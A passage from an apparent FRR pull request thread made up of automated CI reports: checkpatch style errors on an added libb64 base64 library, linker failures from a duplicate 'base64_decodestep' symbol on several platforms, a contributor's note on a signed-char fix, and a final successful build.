^\n    \n    ERROR: space required after that ',' (ctx:VxV)\n    #115: FILE: /tmp/f1-11584/base64.c:115:\n    +\t\t55,56,57,58,59,60,61,-1,\n     \t\t        ^\n    \n    ERROR: space required after that ',' (ctx:VxV)\n    #115: FILE: /tmp/f1-11584/base64.c:115:\n    +\t\t55,56,57,58,59,60,61,-1,\n     \t\t           ^\n    \n    ERROR: space required after that ',' (ctx:VxV)\n    #115: FILE: /tmp/f1-11584/base64.c:115:\n    +\t\t55,56,57,58,59,60,61,-1,\n     \t\t              ^\n    \n    ERROR: space required after that ',' (ctx:VxV)\n    #115: FILE: /tmp/f1-11584/base64.c:115:\n    +\t\t55,56,57,58,59,60,61,-1,\n     \t\t                 ^\n    \n    ERROR: space required after that ',' (ctx:VxO)\n    #115: FILE: /tmp/f1-11584/base64.c:115:\n    +\t\t55,56,57,58,59,60,61,-1,\n     \t\t                    ^\n    \n    ERROR: space required before that '-' (ctx:OxV)\n    #115: FILE: /tmp/f1-11584/base64.c:115:\n    +\t\t55,56,57,58,59,60,61,-1,\n     \t\t                     ^\n    \n    ERROR: space required after that ',' (ctx:VxO)\n    #116: FILE: /tmp/f1-11584/base64.c:116:\n    +\t\t-1,-1,-2,-1,-1,-1,0,1,\n     \t\t  ^\n    \n    ERROR: space required before that '-' (ctx:OxV)\n    #116: FILE: /tmp/f1-11584/base64.c:116:\n    +\t\t-1,-1,-2,-1,-1,-1,0,1,\n     \t\t   ^\n    \n    ERROR: space required after that ',' (ctx:VxO)\n    #116: FILE: /tmp/f1-11584/base64.c:116:\n    +\t\t-1,-1,-2,-1,-1,-1,0,1,\n     \t\t     ^\n    \n    ERROR: space required before that '-' (ctx:OxV)\n    #116: FILE: /tmp/f1-11584/base64.c:116:\n    +\t\t-1,-1,-2,-1,-1,-1,0,1,\n     \t\t      ^\n    \n    ERROR: space required after that ',' (ctx:VxO)\n    #116: FILE: /tmp/f1-11584/base64.c:116:\n    +\t\t-1,-1,-2,-1,-1,-1,0,1,\n     \t\t        ^\n    \n    ERROR: space required before that '-' (ctx:OxV)\n    #116: FILE: /tmp/f1-11584/base64.c:116:\n    +\t\t-1,-1,-2,-1,-1,-1,0,1,\n     \t\t         ^\n    \n    ERROR: space required after that ',' (ctx:VxO)\n    #116: FILE: /tmp/f1-11584/base64.c:116:\n    +\t\t-1,-1,-2,-1,-1,-1,0,1,\n     \t\t           ^\n    \n    ERROR: space required before that '-' (ctx:OxV)\n    #116: FILE: /tmp/f1-11584/base64.c:116:\n    +\t\t-1,-1,-2,-1,-1,-1,0,1,\n     \t\t            ^\n    \n    ERROR: space required after that ',' (ctx:VxO)\n    #116: FILE: /tmp/f1-11584/base64.c:116:\n    +\t\t-1,-1,-2,-1,-1,-1,0,1,\n     \t\t              ^\n    \n    ERROR: space required before that '-' (ctx:OxV)\n    #116: FILE: /tmp/f1-11584/base64.c:116:\n    +\t\t-1,-1,-2,-1,-1,-1,0,1,\n     \t\t               ^\n    \n    ERROR: space required after that ',' (ctx:VxV)\n    #116: FILE: /tmp/f1-11584/base64.c:116:\n    +\t\t-1,-1,-2,-1,-1,-1,0,1,\n     \t\t                 ^\n    \n    ERROR: space required after that ',' (ctx:VxV)\n    #116: FILE: /tmp/f1-11584/base64.c:116:\n    +\t\t-1,-1,-2,-1,-1,-1,0,1,\n     \t\t                   ^\n    \n    ERROR: space required after that ',' (ctx:VxV)\n    #117: FILE: /tmp/f1-11584/base64.c:117:\n    +\t\t2, 3,4,5,6,7,8,9,\n     \t\t    ^\n    \n    ERROR: space required after that ',' (ctx:VxV)\n    #117: FILE: /tmp/f1-11584/base64.c:117:\n    +\t\t2, 3,4,5,6,7,8,9,\n     \t\t      ^\n    \n    ERROR: space required after that ',' (ctx:VxV)\n    #117: FILE: /tmp/f1-11584/base64.c:117:\n    +\t\t2, 3,4,5,6,7,8,9,\n     \t\t        ^\n    \n    ERROR: space required after that ',' (ctx:VxV)\n    #117: FILE: /tmp/f1-11584/base64.c:117:\n    +\t\t2, 3,4,5,6,7,8,9,\n     \t\t          ^\n    \n    ERROR: space required after that ',' (ctx:VxV)\n    #117: FILE: /tmp/f1-11584/base64.c:117:\n    +\t\t2, 3,4,5,6,7,8,9,\n     \t\t            ^\n    \n    ERROR: space required after that ',' (ctx:VxV)\n    #117: FILE: /tmp/f1-11584/base64.c:117:\n    +\t\t2, 3,4,5,6,7,8,9,\n     \t\t              ^\n    \n    ERROR: space required after that ',' (ctx:VxV)\n    #118: FILE: /tmp/f1-11584/base64.c:118:\n    +\t\t10,11,12,13,14,15,16,17,\n     \t\t  ^\n    \n    ERROR: space required after that ',' (ctx:VxV)\n    #118: FILE: /tmp/f1-11584/base64.c:118:\n    +\t\t10,11,12,13,14,15,16,17,\n     \t\t     ^\n    \n    ERROR: space required after that ',' (ctx:VxV)\n    #118: FILE: /tmp/f1-11584/base64.c:118:\n    +\t\t10,11,12,13,14,15,16,17,\n     \t\t        ^\n    \n    ERROR: space required after that ',' (ctx:VxV)\n    #118: FILE: /tmp/f1-11584/base64.c:118:\n    +\t\t10,11,12,13,14,15,16,17,\n     \t\t           ^\n    \n    ERROR: space required after that ',' (ctx:VxV)\n    #118: FILE: /tmp/f1-11584/base64.c:118:\n    +\t\t10,11,12,13,14,15,16,17,\n     \t\t              ^\n    \n    ERROR: space required after that ',' (ctx:VxV)\n    #118: FILE: /tmp/f1-11584/base64.c:118:\n    +\t\t10,11,12,13,14,15,16,17,\n     \t\t                 ^\n    \n    ERROR: space required after that ',' (ctx:VxV)\n    #118: FILE: /tmp/f1-11584/base64.c:118:\n    +\t\t10,11,12,13,14,15,16,17,\n     \t\t                    ^\n    \n    ERROR: space required after that ',' (ctx:VxV)\n    #119: FILE: /tmp/f1-11584/base64.c:119:\n    +\t\t18,19,20,21,22,23,24,25,\n     \t\t  ^\n    \n    ERROR: space required after that ',' (ctx:VxV)\n    #119: FILE: /tmp/f1-11584/base64.c:119:\n    +\t\t18,19,20,21,22,23,24,25,\n     \t\t     ^\n    \n    ERROR: space required after that ',' (ctx:VxV)\n    #119: FILE: /tmp/f1-11584/base64.c:119:\n    +\t\t18,19,20,21,22,23,24,25,\n     \t\t        ^\n    \n    ERROR: space required after that ',' (ctx:VxV)\n    #119: FILE: /tmp/f1-11584/base64.c:119:\n    +\t\t18,19,20,21,22,23,24,25,\n     \t\t           ^\n    \n    ERROR: space required after that ',' (ctx:VxV)\n    #119: FILE: /tmp/f1-11584/base64.c:119:\n    +\t\t18,19,20,21,22,23,24,25,\n     \t\t              ^\n    \n    ERROR: space required after that ',' (ctx:VxV)\n    #119: FILE: /tmp/f1-11584/base64.c:119:\n    +\t\t18,19,20,21,22,23,24,25,\n     \t\t                 ^\n    \n    ERROR: space required after that ',' (ctx:VxV)\n    #119: FILE: /tmp/f1-11584/base64.c:119:\n    +\t\t18,19,20,21,22,23,24,25,\n     \t\t                    ^\n    \n    ERROR: space required after that ',' (ctx:VxO)\n    #120: FILE: /tmp/f1-11584/base64.c:120:\n    +\t\t-1,-1,-1,-1,-1,-1,26,27,\n     \t\t  ^\n    \n    ERROR: space required before that '-' (ctx:OxV)\n    #120: FILE: /tmp/f1-11584/base64.c:120:\n    +\t\t-1,-1,-1,-1,-1,-1,26,27,\n     \t\t   ^\n    \n    ERROR: space required after that ',' (ctx:VxO)\n    #120: FILE: /tmp/f1-11584/base64.c:120:\n    +\t\t-1,-1,-1,-1,-1,-1,26,27,\n     \t\t     ^\n    \n    ERROR: space required before that '-' (ctx:OxV)\n    #120: FILE: /tmp/f1-11584/base64.c:120:\n    +\t\t-1,-1,-1,-1,-1,-1,26,27,\n     \t\t      ^\n    \n    ERROR: space required after that ',' (ctx:VxO)\n    #120: FILE: /tmp/f1-11584/base64.c:120:\n    +\t\t-1,-1,-1,-1,-1,-1,26,27,\n     \t\t        ^\n    \n    ERROR: space required before that '-' (ctx:OxV)\n    #120: FILE: /tmp/f1-11584/base64.c:120:\n    +\t\t-1,-1,-1,-1,-1,-1,26,27,\n     \t\t         ^\n    \n    ERROR: space required after that ',' (ctx:VxO)\n    #120: FILE: /tmp/f1-11584/base64.c:120:\n    +\t\t-1,-1,-1,-1,-1,-1,26,27,\n     \t\t           ^\n    \n    ERROR: space required before that '-' (ctx:OxV)\n    #120: FILE: /tmp/f1-11584/base64.c:120:\n    +\t\t-1,-1,-1,-1,-1,-1,26,27,\n     \t\t            ^\n    \n    ERROR: space required after that ',' (ctx:VxO)\n    #120: FILE: /tmp/f1-11584/base64.c:120:\n    +\t\t-1,-1,-1,-1,-1,-1,26,27,\n     \t\t              ^\n    \n    ERROR: space required before that '-' (ctx:OxV)\n    #120: FILE: /tmp/f1-11584/base64.c:120:\n    +\t\t-1,-1,-1,-1,-1,-1,26,27,\n     \t\t               ^\n    \n    ERROR: space required after that ',' (ctx:VxV)\n    #120: FILE: /tmp/f1-11584/base64.c:120:\n    +\t\t-1,-1,-1,-1,-1,-1,26,27,\n     \t\t                 ^\n    \n    ERROR: space required after that ',' (ctx:VxV)\n    #120: FILE: /tmp/f1-11584/base64.c:120:\n    +\t\t-1,-1,-1,-1,-1,-1,26,27,\n     \t\t                    ^\n    \n    ERROR: space required after that ',' (ctx:VxV)\n    #121: FILE: /tmp/f1-11584/base64.c:121:\n    +\t\t28,29,30,31,32,33,34,35,\n     \t\t  ^\n    \n    ERROR: space required after that ',' (ctx:VxV)\n    #121: FILE: /tmp/f1-11584/base64.c:121:\n    +\t\t28,29,30,31,32,33,34,35,\n     \t\t     ^\n    \n    ERROR: space required after that ',' (ctx:VxV)\n    #121: FILE: /tmp/f1-11584/base64.c:121:\n    +\t\t28,29,30,31,32,33,34,35,\n     \t\t        ^\n    \n    ERROR: space required after that ',' (ctx:VxV)\n    #121: FILE: /tmp/f1-11584/base64.c:121:\n    +\t\t28,29,30,31,32,33,34,35,\n     \t\t           ^\n    \n    ERROR: space required after that ',' (ctx:VxV)\n    #121: FILE: /tmp/f1-11584/base64.c:121:\n    +\t\t28,29,30,31,32,33,34,35,\n     \t\t              ^\n    \n    ERROR: space required after that ',' (ctx:VxV)\n    #121: FILE: /tmp/f1-11584/base64.c:121:\n    +\t\t28,29,30,31,32,33,34,35,\n     \t\t                 ^\n    \n    ERROR: space required after that ',' (ctx:VxV)\n    #121: FILE: /tmp/f1-11584/base64.c:121:\n    +\t\t28,29,30,31,32,33,34,35,\n     \t\t                    ^\n    \n    ERROR: space required after that ',' (ctx:VxV)\n    #122: FILE: /tmp/f1-11584/base64.c:122:\n    +\t\t36,37,38,39,40,41,42,43,\n     \t\t  ^\n    \n    ERROR: space required after that ',' (ctx:VxV)\n    #122: FILE: /tmp/f1-11584/base64.c:122:\n    +\t\t36,37,38,39,40,41,42,43,\n     \t\t     ^\n    \n    ERROR: space required after that ',' (ctx:VxV)\n    #122: FILE: /tmp/f1-11584/base64.c:122:\n    +\t\t36,37,38,39,40,41,42,43,\n     \t\t        ^\n    \n    ERROR: space required after that ',' (ctx:VxV)\n    #122: FILE: /tmp/f1-11584/base64.c:122:\n    +\t\t36,37,38,39,40,41,42,43,\n     \t\t           ^\n    \n    ERROR: space required after that ',' (ctx:VxV)\n    #122: FILE: /tmp/f1-11584/base64.c:122:\n    +\t\t36,37,38,39,40,41,42,43,\n     \t\t              ^\n    \n    ERROR: space required after that ',' (ctx:VxV)\n    #122: FILE: /tmp/f1-11584/base64.c:122:\n    +\t\t36,37,38,39,40,41,42,43,\n     \t\t                 ^\n    \n    ERROR: space required after that ',' (ctx:VxV)\n    #122: FILE: /tmp/f1-11584/base64.c:122:\n    +\t\t36,37,38,39,40,41,42,43,\n     \t\t                    ^\n    \n    ERROR: space required after that ',' (ctx:VxV)\n    #123: FILE: /tmp/f1-11584/base64.c:123:\n    +\t\t44,45,46,47,48,49,50,51\n     \t\t  ^\n    \n    ERROR: space required after that ',' (ctx:VxV)\n    #123: FILE: /tmp/f1-11584/base64.c:123:\n    +\t\t44,45,46,47,48,49,50,51\n     \t\t     ^\n    \n    ERROR: space required after that ',' (ctx:VxV)\n    #123: FILE: /tmp/f1-11584/base64.c:123:\n    +\t\t44,45,46,47,48,49,50,51\n     \t\t        ^\n    \n    ERROR: space required after that ',' (ctx:VxV)\n    #123: FILE: /tmp/f1-11584/base64.c:123:\n    +\t\t44,45,46,47,48,49,50,51\n     \t\t           ^\n    \n    ERROR: space required after that ',' (ctx:VxV)\n    #123: FILE: /tmp/f1-11584/base64.c:123:\n    +\t\t44,45,46,47,48,49,50,51\n     \t\t              ^\n    \n    ERROR: space required after that ',' (ctx:VxV)\n    #123: FILE: /tmp/f1-11584/base64.c:123:\n    +\t\t44,45,46,47,48,49,50,51\n     \t\t                 ^\n    \n    ERROR: space required after that ',' (ctx:VxV)\n    #123: FILE: /tmp/f1-11584/base64.c:123:\n    +\t\t44,45,46,47,48,49,50,51\n     \t\t                    ^\n    \n    ERROR: trailing statements should be on next line\n    #126: FILE: /tmp/f1-11584/base64.c:126:\n    +\tif (value_in < 0 || value_in >= 80) return -1;\n    \n    ERROR: \"foo* bar\" should be \"foo *bar\"\n    #130: FILE: /tmp/f1-11584/base64.c:130:\n    +void base64_init_decodestate(base64_decodestate* state_in)\n    \n    ERROR: \"foo* bar\" should be \"foo *bar\"\n    #136: FILE: /tmp/f1-11584/base64.c:136:\n    +int base64_decode_block(const char* code_in, int length_in, char* plaintext_out,\n    \n    ERROR: \"foo* bar\" should be \"foo *bar\"\n    #136: FILE: /tmp/f1-11584/base64.c:136:\n    +int base64_decode_block(const char* code_in, int length_in, char* plaintext_out,\n    \n    ERROR: \"foo* bar\" should be \"foo *bar\"\n    #137: FILE: /tmp/f1-11584/base64.c:137:\n    +\t\t\tbase64_decodestate* state_in)\n    \n    ERROR: \"foo* bar\" should be \"foo *bar\"\n    #139: FILE: /tmp/f1-11584/base64.c:139:\n    +\tconst char* codechar = code_in;\n    \n    ERROR: \"foo* bar\" should be \"foo *bar\"\n    #140: FILE: /tmp/f1-11584/base64.c:140:\n    +\tchar* plainchar = plaintext_out;\n    \n    ERROR: that open brace { should be on the previous line\n    #145: FILE: /tmp/f1-11584/base64.c:145:\n    +\tswitch (state_in->step)\n    +\t{\n    \n    ERROR: that open brace { should be on the previous line\n    #147: FILE: /tmp/f1-11584/base64.c:147:\n    +\t\twhile (1)\n    +\t\t{\n    \n    WARNING: suspect code indent for conditional statements (16, 16)\n    #147: FILE: /tmp/f1-11584/base64.c:147:\n    +\t\twhile (1)\n    +\t\t{\n    \n    ERROR: that open brace { should be on the previous line\n    #151: FILE: /tmp/f1-11584/base64.c:151:\n    +\t\t\t\tif (codechar == code_in+length_in)\n    +\t\t\t\t{\n    \n    ERROR: that open brace { should be on the previous line\n    #163: FILE: /tmp/f1-11584/base64.c:163:\n    +\t\t\t\tif (codechar == code_in+length_in)\n    +\t\t\t\t{\n    \n    ERROR: that open brace { should be on the previous line\n    #176: FILE: /tmp/f1-11584/base64.c:176:\n    +\t\t\t\tif (codechar == code_in+length_in)\n    +\t\t\t\t{\n    \n    ERROR: that open brace { should be on the previous line\n    #189: FILE: /tmp/f1-11584/base64.c:189:\n    +\t\t\t\tif (codechar == code_in+length_in)\n    +\t\t\t\t{\n    Report for base64.h | 85 issues\n    ===============================================\n    WARNING: Block comments use * on subsequent lines\n    #2: FILE: /tmp/f1-11584/base64.h:2:\n    +/*\n    +This is part of the libb64 project, and has been placed in the public domain.\n    \n    WARNING: do not add new typedefs\n    #9: FILE: /tmp/f1-11584/base64.h:9:\n    +typedef enum\n    \n    ERROR: open brace '{' following enum go on the same line\n    #10: FILE: /tmp/f1-11584/base64.h:10:\n    +typedef enum\n    +{\n    \n    WARNING: do not add new typedefs\n    #14: FILE: /tmp/f1-11584/base64.h:14:\n    +typedef struct\n    \n    ERROR: open brace '{' following struct go on the same line\n    #15: FILE: /tmp/f1-11584/base64.h:15:\n    +typedef struct\n    +{\n    \n    ERROR: \"foo* bar\" should be \"foo *bar\"\n    #21: FILE: /tmp/f1-11584/base64.h:21:\n    +void base64_init_encodestate(base64_encodestate* state_in);\n    \n    ERROR: \"foo* bar\" should be \"foo *bar\"\n    #25: FILE: /tmp/f1-11584/base64.h:25:\n    +int base64_encode_block(const char* plaintext_in, int length_in, char* code_out,\n    \n    ERROR: \"foo* bar\" should be \"foo *bar\"\n    #25: FILE: /tmp/f1-11584/base64.h:25:\n    +int base64_encode_block(const char* plaintext_in, int length_in, char* code_out,\n    \n    ERROR: \"foo* bar\" should be \"foo *bar\"\n    #26: FILE: /tmp/f1-11584/base64.h:26:\n    +\t\t\tbase64_encodestate* state_in);\n    \n    ERROR: \"foo* bar\" should be \"foo *bar\"\n    #28: FILE: /tmp/f1-11584/base64.h:28:\n    +int base64_encode_blockend(char* code_out, base64_encodestate* state_in);\n    \n    ERROR: \"foo* bar\" should be \"foo *bar\"\n    #28: FILE: /tmp/f1-11584/base64.h:28:\n    +int base64_encode_blockend(char* code_out, base64_encodestate* state_in);\n    \n    WARNING: do not add new typedefs\n    #31: FILE: /tmp/f1-11584/base64.h:31:\n    +typedef enum\n    \n    ERROR: open brace '{' following enum go on the same line\n    #32: FILE: /tmp/f1-11584/base64.h:32:\n    +typedef enum\n    +{\n    \n    WARNING: do not add new typedefs\n    #36: FILE: /tmp/f1-11584/base64.h:36:\n    +typedef struct\n    \n    ERROR: open brace '{' following struct go on the same line\n    #37: FILE: /tmp/f1-11584/base64.h:37:\n    +typedef struct\n    +{\n    \n    ERROR: \"foo* bar\" should be \"foo *bar\"\n    #42: FILE: /tmp/f1-11584/base64.h:42:\n    +void base64_init_decodestate(base64_decodestate* state_in);\n    \n    ERROR: \"foo* bar\" should be \"foo *bar\"\n    #46: FILE: /tmp/f1-11584/base64.h:46:\n    +int base64_decode_block(const char* code_in, int length_in, char* plaintext_out,\n    \n    ERROR: \"foo* bar\" should be \"foo *bar\"\n    #46: FILE: /tmp/f1-11584/base64.h:46:\n    +int base64_decode_block(const char* code_in, int length_in, char* plaintext_out,\n    \n    ERROR: \"foo* bar\" should be \"foo *bar\"\n    #47: FILE: /tmp/f1-11584/base64.h:47:\n    +\t\t\tbase64_decodestate* state_in);\n    \n    WARNING: C99 // comments do not match recommendation\n    #49: FILE: /tmp/f1-11584/base64.h:49:\n    +#endif //_BASE64_H_\n    Report for yang_wrappers.c | 8 issues\n    ===============================================\n    < WARNING: Missing a blank line after declarations\n    < #688: FILE: /tmp/f1-11584/yang_wrappers.c:688:\n    < WARNING: Missing a blank line after declarations\n    < #691: FILE: /tmp/f1-11584/yang_wrappers.c:691:\n    < WARNING: Missing a blank line after declarations\n    < #696: FILE: /tmp/f1-11584/yang_wrappers.c:696:\n    < WARNING: Missing a blank line after declarations\n    < #709: FILE: /tmp/f1-11584/yang_wrappers.c:709:\n\n</details>\n\n</details> all required changes have been placed. but you can see from the previous CI results that this libb64 leads to a lot of compiling failures. To eliminate these failures, I have to slightly revise the code in libb64 by changing `int base64_decode_value(char value_in)` to `signed char base64_decode_value(signed char value_in)`.\r\n\r\nperhaps we need to find another reliable base64 lib. please suggest if more changes are required. @whichbug  can you please cleanup the style and we will merge it. <details><summary>Continuous Integration Result: FAILED</summary>\n\n#  Continuous Integration Result: FAILED\n\nSee below for issues.\nCI System Testrun URL: https://ci1.netdef.org/browse/FRR-PULLREQ2-3613/\n\nThis is a comment from an automated CI system.\nFor questions and feedback in regards to this CI system, please feel free to email\nMartin Winter - mwinter (at) opensourcerouting.org.\n\n### Get source / Pull Request: Successful\n### Building Stage: Failed\n<details>\n<summary>Debian 11 amd64 build: Failed (click for details)</summary>\nDebian 11 amd64 build: config.status output from configure script can be found at https://ci1.netdef.org/browse/FRR-PULLREQ2-3613/artifact/DEB11AMD64/config.status/config.status\n\n__Make failed for Debian 11 amd64 build__:\n    (see full Make log at https://ci1.netdef.org/browse/FRR-PULLREQ2-3613/artifact/DEB11AMD64/ErrorLog/log_make.txt)\n\n     1574 | CPP_NOTICE(\"Use of the local-block command is deprecated\")\n    /usr/bin/ld: lib/.libs/yang_wrappers.o:/home/ci/cibuild.3613/frr-source/lib/base64.h:31: multiple definition of `base64_decodestep'; lib/.libs/base64.o:/home/ci/cibuild.3613/frr-source/lib/base64.h:31: first defined here\n    collect2: error: ld returned 1 exit status\n    make[1]: *** [Makefile:7499: lib/libfrr.la] Error 1\n    make[1]: Target 'all-am' not remade because of errors.\n    make[1]: Leaving directory '/home/ci/cibuild.3613/frr-source'\n    make: *** [Makefile:6306: all] Error 2\n\nDebian 11 amd64 build: Unknown Log <config.log.gz>\n    URL: https://ci1.netdef.org/browse/FRR-PULLREQ2-3613/artifact/DEB11AMD64/config.log/config.log.gz\n</details>\n<details>\n<summary>FreeBSD 11 amd64 build: Failed (click for details)</summary>\n\n__Make failed for FreeBSD 11 amd64 build__:\n    (see full Make log at https://ci1.netdef.org/browse/FRR-PULLREQ2-3613/artifact/CI009BUILD/ErrorLog/log_make.txt)\n\n     1574 | CPP_NOTICE(\"Use of the local-block command is deprecated\")\n    /usr/local/bin/ld: lib/.libs/yang_wrappers.o:/usr/home/ci/cibuild.3613/frr-source/lib/base64.h:31: multiple definition of `base64_decodestep'; lib/.libs/base64.o:/usr/home/ci/cibuild.3613/frr-source/lib/base64.h:31: first defined here\n    collect2: error: ld returned 1 exit status\n    gmake[1]: *** [Makefile:7498: lib/libfrr.la] Error 1\n    gmake[1]: Leaving directory '/usr/home/ci/cibuild.3613/frr-source'\n    gmake[1]: Target 'all-am' not remade because of errors.\n    gmake: *** [Makefile:6305: all] Error 2\n\nFreeBSD 11 amd64 build: config.status output from configure script can be found at https://ci1.netdef.org/browse/FRR-PULLREQ2-3613/artifact/CI009BUILD/config.status/config.status\nFreeBSD 11 amd64 build: Unknown Log <config.log.gz>\n    URL: https://ci1.netdef.org/browse/FRR-PULLREQ2-3613/artifact/CI009BUILD/config.log/config.log.gz\n</details>\n<details>\n<summary>OpenBSD 7 amd64 build: Failed (click for details)</summary>\n\n__Make failed for OpenBSD 7 amd64 build__:\n    (see full Make log at https://ci1.netdef.org/browse/FRR-PULLREQ2-3613/artifact/CI011BUILD/ErrorLog/log_make.txt)\n\n     ^\n    1 warning generated.\n    ld: error: duplicate symbol: base64_decodestep\n    >>> defined at base64.h:31 (./lib/base64.h:31)\n    >>>            lib/.libs/base64.o:(base64_decodestep)\n    >>> defined at base64.h:31 (./lib/base64.h:31)\n    >>>            lib/.libs/yang_wrappers.o:(.bss+0x0)\n    clang: error: linker command failed with exit code 1 (use -v to see invocation)\n    gmake[1]: *** [Makefile:7498: lib/libfrr.la] Error 1\n\nOpenBSD 7 amd64 build: config.status output from configure script can be found at https://ci1.netdef.org/browse/FRR-PULLREQ2-3613/artifact/CI011BUILD/config.status/config.status\nOpenBSD 7 amd64 build: Unknown Log <config.log.gz>\n    URL: https://ci1.netdef.org/browse/FRR-PULLREQ2-3613/artifact/CI011BUILD/config.log/config.log.gz\n</details>\n<details><summary>Successful on other platforms/tests</summary>\n\n- Ubuntu 18.04 arm8 build\n- Ubuntu 20.04 amd64 build\n- Debian 9 amd64 build\n- Ubuntu 18.04 ppc64le build\n- Fedora 29 amd64 build\n- Debian 10 amd64 build\n- Ubuntu 18.04 arm7 build\n- Ubuntu 16.04 arm7 build\n- CentOS 7 amd64 build\n- Ubuntu 16.04 i386 build\n- Ubuntu 18.04 amd64 build\n- Ubuntu 16.04 amd64 build\n- NetBSD 9 amd64 build\n- FreeBSD 12 amd64 build\n- Ubuntu 16.04 arm8 build\n- Redhat 8 amd64 build\n- Ubuntu 18.04 i386 build\n</details>\n\n### Warnings Generated during build:\n\n<details><summary>Checkout code: Successful with additional warnings</summary>\n<details>\n<summary>Debian 11 amd64 build: Failed (click for details)</summary>\nDebian 11 amd64 build: config.status output from configure script can be found at https://ci1.netdef.org/browse/FRR-PULLREQ2-3613/artifact/DEB11AMD64/config.status/config.status\n\n__Make failed for Debian 11 amd64 build__:\n    (see full Make log at https://ci1.netdef.org/browse/FRR-PULLREQ2-3613/artifact/DEB11AMD64/ErrorLog/log_make.txt)\n\n     1574 | CPP_NOTICE(\"Use of the local-block command is deprecated\")\n    /usr/bin/ld: lib/.libs/yang_wrappers.o:/home/ci/cibuild.3613/frr-source/lib/base64.h:31: multiple definition of `base64_decodestep'; lib/.libs/base64.o:/home/ci/cibuild.3613/frr-source/lib/base64.h:31: first defined here\n    collect2: error: ld returned 1 exit status\n    make[1]: *** [Makefile:7499: lib/libfrr.la] Error 1\n    make[1]: Target 'all-am' not remade because of errors.\n    make[1]: Leaving directory '/home/ci/cibuild.3613/frr-source'\n    make: *** [Makefile:6306: all] Error 2\n\nDebian 11 amd64 build: Unknown Log <config.log.gz>\n    URL: https://ci1.netdef.org/browse/FRR-PULLREQ2-3613/artifact/DEB11AMD64/config.log/config.log.gz\n</details>\n<details>\n<summary>FreeBSD 11 amd64 build: Failed (click for details)</summary>\n\n__Make failed for FreeBSD 11 amd64 build__:\n    (see full Make log at https://ci1.netdef.org/browse/FRR-PULLREQ2-3613/artifact/CI009BUILD/ErrorLog/log_make.txt)\n\n     1574 | CPP_NOTICE(\"Use of the local-block command is deprecated\")\n    /usr/local/bin/ld: lib/.libs/yang_wrappers.o:/usr/home/ci/cibuild.3613/frr-source/lib/base64.h:31: multiple definition of `base64_decodestep'; lib/.libs/base64.o:/usr/home/ci/cibuild.3613/frr-source/lib/base64.h:31: first defined here\n    collect2: error: ld returned 1 exit status\n    gmake[1]: *** [Makefile:7498: lib/libfrr.la] Error 1\n    gmake[1]: Leaving directory '/usr/home/ci/cibuild.3613/frr-source'\n    gmake[1]: Target 'all-am' not remade because of errors.\n    gmake: *** [Makefile:6305: all] Error 2\n\nFreeBSD 11 amd64 build: config.status output from configure script can be found at https://ci1.netdef.org/browse/FRR-PULLREQ2-3613/artifact/CI009BUILD/config.status/config.status\nFreeBSD 11 amd64 build: Unknown Log <config.log.gz>\n    URL: https://ci1.netdef.org/browse/FRR-PULLREQ2-3613/artifact/CI009BUILD/config.log/config.log.gz\n</details>\n<details>\n<summary>OpenBSD 7 amd64 build: Failed (click for details)</summary>\n\n__Make failed for OpenBSD 7 amd64 build__:\n    (see full Make log at https://ci1.netdef.org/browse/FRR-PULLREQ2-3613/artifact/CI011BUILD/ErrorLog/log_make.txt)\n\n     ^\n    1 warning generated.\n    ld: error: duplicate symbol: base64_decodestep\n    >>> defined at base64.h:31 (./lib/base64.h:31)\n    >>>            lib/.libs/base64.o:(base64_decodestep)\n    >>> defined at base64.h:31 (./lib/base64.h:31)\n    >>>            lib/.libs/yang_wrappers.o:(.bss+0x0)\n    clang: error: linker command failed with exit code 1 (use -v to see invocation)\n    gmake[1]: *** [Makefile:7498: lib/libfrr.la] Error 1\n\nOpenBSD 7 amd64 build: config.status output from configure script can be found at https://ci1.netdef.org/browse/FRR-PULLREQ2-3613/artifact/CI011BUILD/config.status/config.status\nOpenBSD 7 amd64 build: Unknown Log <config.log.gz>\n    URL: https://ci1.netdef.org/browse/FRR-PULLREQ2-3613/artifact/CI011BUILD/config.log/config.log.gz\n</details>\n\n    Report for base64.c | 14 issues\n    ===============================================\n    WARNING: line over 80 characters\n    #20: FILE: /tmp/f1-15006/base64.c:20:\n    +\t\t\"ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/\";\n    \n    WARNING: suspect code indent for conditional statements (16, 16)\n    #38: FILE: /tmp/f1-15006/base64.c:38:\n    +\t\twhile (1) {\n    +\t\tcase step_A:\n    \n    WARNING: suspect code indent for conditional statements (16, 16)\n    #143: FILE: /tmp/f1-15006/base64.c:143:\n    +\t\twhile (1) {\n    +\t\tcase step_a:\n    Report for yang_wrappers.c | 8 issues\n    ===============================================\n    < WARNING: Missing a blank line after declarations\n    < #688: FILE: /tmp/f1-15006/yang_wrappers.c:688:\n    < WARNING: Missing a blank line after declarations\n    < #691: FILE: /tmp/f1-15006/yang_wrappers.c:691:\n    < WARNING: Missing a blank line after declarations\n    < #696: FILE: /tmp/f1-15006/yang_wrappers.c:696:\n    < WARNING: Missing a blank line after declarations\n    < #709: FILE: /tmp/f1-15006/yang_wrappers.c:709:\n\n</details>\n\n</details> <details><summary>Continuous Integration Result: SUCCESSFUL</summary>\n\n#  Continuous Integration Result: SUCCESSFUL\n\nCongratulations, this patch passed basic tests\n\nTested-by: NetDEF / OpenSourceRouting.org CI System\n\nCI System Testrun URL: https://ci1.netdef.org/browse/FRR-PULLREQ2-3614/\n\nThis is a comment from an automated CI system.\nFor questions and feedback in regards to this CI system, please feel free to email\nMartin Winter - mwinter (at) opensourcerouting.org.\n\n\n### Warnings Generated during build:\n\n<details><summary>Checkout code: Successful with additional warnings</summary>\n\n    Report for base64.c | 14 issues\n    ===============================================\n    WARNING: line over 80 characters\n    #20: FILE: /tmp/f1-4970/base64.c:20:\n    +\t\t\"ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/\";\n    \n    WARNING: suspect code indent for conditional statements (16, 16)\n    #38: FILE: /tmp/f1-4970/base64.c:38:\n    +\t\twhile (1) {\n    +\t\tcase step_A:\n    \n    WARNING: suspect code indent for conditional statements (16, 16)\n    #143: FILE: /tmp/f1-4970/base64.c:143:\n    +\t\twhile (1) {\n    +\t\tcase step_a:\n    Report for yang_wrappers.c | 8 issues\n    ===============================================\n    < WARNING: Missing a blank line after declarations\n    < #688: FILE: /tmp/f1-4970/yang_wrappers.c:688:\n    < WARNING: Missing a blank line after declarations\n    < #691: FILE: /tmp/f1-4970/yang_wrappers.c:691:\n    < WARNING: Missing a blank line after declarations\n    < #696: FILE: /tmp/f1-4970/yang_wrappers.c:696:\n    < WARNING: Missing a blank line after declarations\n    < #709: FILE: 